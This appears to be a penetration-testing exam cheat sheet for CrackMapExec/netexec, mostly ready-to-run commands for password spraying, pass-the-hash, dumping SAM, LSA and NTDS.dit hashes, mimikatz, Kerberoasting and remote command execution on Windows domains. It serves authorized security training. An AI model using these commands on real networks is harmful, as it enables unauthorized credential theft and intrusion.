# crackmapexec — CME / "the Swiss army knife for pentesting networks"

> **If the exam gives you AD creds and a subnet, start with CME.** One binary sprays credentials across SMB/WinRM/MSSQL/LDAP/SSH/FTP, checks what you can read, enumerates users/groups/shares/password policy, and runs post-ex modules. The modern fork is `netexec` (`nxc`) — same flags, same usage.

**Install check (Parrot — already installed):** `crackmapexec --version` · if missing, try `nxc --version` (netexec).

---

## 🎯 Cheat-flow: "What do I do with CME?"

| You need to... | Run this |
|---|---|
| Check **SMB is up** and get hostname/domain | `crackmapexec smb <IP>` |
| **Validate a credential** | `crackmapexec smb <IP> -u <USER> -p <PASS>` |
| **Validate an NTLM hash** (pass-the-hash) | `crackmapexec smb <IP> -u <USER> -H <NTLMHASH>` |
| **Password spray** one password across many users | `crackmapexec smb <IP> -u users.txt -p 'Summer2026!' --continue-on-success` |
| Spray one user across many hosts | `crackmapexec smb 10.10.10.0/24 -u admin -p 'Pass123'` |
| List **shares** I can access | `crackmapexec smb <IP> -u <U> -p <P> --shares` |
| List **users** from AD | `crackmapexec smb <IP> -u <U> -p <P> --users` |
| List **groups** | `crackmapexec smb <IP> -u <U> -p <P> --groups` |
| Dump **password policy** | `crackmapexec smb <IP> -u <U> -p <P> --pass-pol` |
| Dump **local SAM hashes** (needs admin) | `crackmapexec smb <IP> -u <U> -p <P> --sam` |
| Dump **LSA secrets** | `crackmapexec smb <IP> -u <U> -p <P> --lsa` |
| Dump **NTDS.dit** (DC only, DA creds) | `crackmapexec smb <DC> -u <U> -p <P> --ntds` |
| Execute a command (psexec-style) | `crackmapexec smb <IP> -u <U> -p <P> -x 'whoami /all'` |
| Execute via WMI instead | `crackmapexec smb <IP> -u <U> -p <P> --exec-method wmiexec -x 'whoami'` |
| WinRM access | `crackmapexec winrm <IP> -u <U> -p <P>` |
| MSSQL access | `crackmapexec mssql <IP> -u <U> -p <P>` |
| Check for **null session** | `crackmapexec smb <IP> -u '' -p ''` |
| Check for **guest session** | `crackmapexec smb <IP> -u guest -p ''` |
| **Kerberoast** via module | `crackmapexec ldap <DC> -u <U> -p <P> --kerberoasting kerb.out` |
| **AS-REP roast** | `crackmapexec ldap <DC> -u <U> -p <P> --asreproast asrep.out` |
| List available modules | `crackmapexec smb -L` |
| Show one module's options | `crackmapexec smb -M <name> --options` |

---

## 🔑 Flags you must know cold

### Protocols (first positional arg)
| Value | Service |
|---|---|
| `smb` | SMB (445) — the big one |
| `winrm` | WinRM (5985/5986) |
| `mssql` | MSSQL (1433) |
| `ldap` | LDAP (389/636) |
| `ssh` | SSH (22) |
| `ftp` | FTP (21) |
| `rdp` | RDP (3389) — in netexec |

### Credentials
| Flag | Meaning |
|---|---|
| `-u <user>` or `<file>` | User or user list |
| `-p <pass>` or `<file>` | Password or password list |
| `-H <hash>` | **NTLM hash** (pass-the-hash) — format `LM:NT` or just `NT` |
| `-d <domain>` | Domain name |
| `--local-auth` | Treat creds as local (SAM), not domain |
| `-k` | Use Kerberos auth (requires a TGT in `KRB5CCNAME`) |
| `--no-pass` | No password prompt (use with `-k`) |

### Target control
| Flag | Meaning |
|---|---|
| `<target>` | IP, CIDR, file with `-t`, or hostname |
| `--continue-on-success` | Keep going after first successful login (required for spraying!) |
| `--gfail-limit <n>` | Stop after N global failures (avoid lockout) |
| `--ufail-limit <n>` | Stop after N failures per user |
| `-t <n>` | Thread count |
| `--timeout <n>` | Per-host timeout |

### SMB enumeration
| Flag | Meaning |
|---|---|
| `--shares` | List SMB shares + your access (READ/WRITE) |
| `--users` | Enumerate domain users (RID cycling / SAMR) |
| `--groups` | Enumerate domain groups |
| `--local-groups` | Enumerate local groups on target |
| `--pass-pol` | Dump password policy |
| `--rid-brute [n]` | RID-cycle enumeration up to N |
| `--sessions` | Active sessions on target |
| `--disks` | Disks |
| `--loggedon-users` | Who's logged on |
| `--computers` | Computer accounts (via LDAP) |

### SMB post-ex / dumping
| Flag | Meaning |
|---|---|
| `--sam` | Dump local SAM hashes (admin required) |
| `--lsa` | Dump LSA secrets |
| `--ntds` | Dump NTDS.dit (DC + DA required) |
| `--ntds vss` | Use VSS method (sometimes needed) |
| `-x '<cmd>'` | Execute via cmd |
| `-X '<ps>'` | Execute via PowerShell |
| `--exec-method <m>` | `wmiexec` / `smbexec` / `atexec` / `mmcexec` |
| `-M <module>` | Run a CME module (see `-L`) |

### Output
| Flag | Meaning |
|---|---|
| `--log <file>` | Log output to file |
| `--verbose` | More detail on errors |

---

## 🧪 CME modules (via `-M`) worth knowing

List: `crackmapexec smb -L` — highlights:

| Module | What it does |
|---|---|
| `mimikatz` | Run mimikatz in memory, dumps plaintexts/hashes |
| `lsassy` | Remote LSASS dump |
| `enum_avproducts` | Find installed AV |
| `enum_chrome` | Dump saved Chrome creds |
| `spider_plus` | Recursively list file shares |
| `nopac` | Check/exploit CVE-2021-42278/42287 (sAMAccountName) |
| `zerologon` | Check CVE-2020-1472 |
| `petitpotam` | Coerce NTLM auth |
| `printnightmare` | Check CVE-2021-34527 |
| `gpp_password` | Dump cpassword from SYSVOL |
| `laps` | Dump LAPS passwords |

Run one: `crackmapexec smb <IP> -u <U> -p <P> -M mimikatz`

---

## 📋 Command recipes (copy-paste)

```bash
# 1. Fingerprint every host in a subnet (no creds)
crackmapexec smb 10.10.10.0/24

# 2. Null session check
crackmapexec smb 10.10.10.0/24 -u '' -p ''

# 3. Validate a credential across the whole subnet
crackmapexec smb 10.10.10.0/24 -u admin -p 'Password123' --continue-on-success

# 4. Password spray: one password, many users
crackmapexec smb <DC-IP> -u users.txt -p 'Summer2026!' \
  -d CORP --continue-on-success

# 5. List shares + dump password policy + list users (one run)
crackmapexec smb <IP> -u <U> -p <P> --shares --pass-pol --users

# 6. Pass-the-hash
crackmapexec smb <IP> -u administrator \
  -H aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c \
  --local-auth

# 7. Dump local SAM (admin rights)
crackmapexec smb <IP> -u administrator -p 'Pass123' --local-auth --sam

# 8. Dump NTDS.dit from a DC (needs DA)
crackmapexec smb <DC-IP> -u domadmin -p 'Pass123' -d CORP --ntds

# 9. Execute a command
crackmapexec smb <IP> -u <U> -p <P> -x 'whoami /priv'

# 10. Kerberoast via LDAP
crackmapexec ldap <DC-IP> -u <U> -p <P> -d CORP --kerberoasting tgs.out
# then: hashcat -m 13100 tgs.out /usr/share/wordlists/rockyou.txt

# 11. AS-REP roast
crackmapexec ldap <DC-IP> -u users.txt -p '' -d CORP --asreproast asrep.out
# then: hashcat -m 18200 asrep.out /usr/share/wordlists/rockyou.txt

# 12. WinRM shell check (if "Pwn3d!" shows up you can psexec/evil-winrm in)
crackmapexec winrm <IP> -u <U> -p <P>

# 13. MSSQL with xp_cmdshell
crackmapexec mssql <IP> -u sa -p 'Pass123' --local-auth -x 'whoami'

# 14. Spider shares for interesting files
crackmapexec smb <IP> -u <U> -p <P> -M spider_plus

# 15. Vuln checks
crackmapexec smb <DC-IP> -u '' -p '' -M zerologon
crackmapexec smb <DC-IP> -u <U> -p <P> -M nopac
```

---

## 🧩 Reading CME output

```
SMB   10.10.10.5  445  DC01  [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:CORP)
SMB   10.10.10.5  445  DC01  [+] CORP\admin:Password123 (Pwn3d!)
```

| Marker | Meaning |
|---|---|
| `[*]` | Info (fingerprint) |
| `[+]` | Successful auth |
| `[-]` | Failed |
| `(Pwn3d!)` | **Admin!** You can execute commands / dump SAM / psexec in |
| `STATUS_LOGON_FAILURE` | Wrong creds |
| `STATUS_ACCOUNT_LOCKED_OUT` | You sprayed too hard — stop |
| `STATUS_PASSWORD_MUST_CHANGE` | Creds valid but expired — still useful |

---

## ⚠️ Gotchas

- **`crackmapexec` vs `nxc`** — CME is unmaintained; Parrot may ship `netexec` (`nxc`) instead. Flags are 1:1 — if `crackmapexec` not found, try `nxc`.
- **Domain vs local auth** — for **local** accounts (incl. built-in `administrator` on a workstation) you **must** add `--local-auth`. Otherwise CME tries domain auth and fails.
- **Hash format** for `-H`: CME accepts bare NT hash (32 hex) **or** full `LM:NT`. Don't pass `aad3b...:` with nothing after it.
- **Spraying without `--continue-on-success`** will stop at the first hit — useless for spraying. Always add it.
- **Account lockout** — AD default is 5 bad attempts in 30 min. Pull the policy first with `--pass-pol`, then cap with `--gfail-limit` / `--ufail-limit`.
- **`--ntds` fails on member servers** — it only works on Domain Controllers. Use `--sam` on regular hosts.
- **Kerberos auth (`-k`)** needs `KRB5CCNAME` pointing at a `.ccache` and the DC's hostname resolvable (fix `/etc/hosts`).
- **`(Pwn3d!)` not showing** even though the cred worked → account has no admin rights on that host; you can still enum, not dump SAM / exec.
- **Hashes you dump** go straight into [hashcat](./hashcat.md) `-m 1000` (NTLM) or `-m 1800` (shadow-style). Identify with [hashid](./hashid.md) if in doubt.
- **Rate / threads** — default `-t 100` is loud; drop to `-t 10` on small labs so you don't DoS the target.

---

## 🔗 Related

- [hydra](./hydra.md) — generic brute forcer, use if CME doesn't cover the service
- [hashcat](./hashcat.md) — crack the NTLM / Kerberos hashes CME dumps
- [john](./john.md) — alternate cracker, better auto-detection
- [hashid](./hashid.md) — identify what you dumped
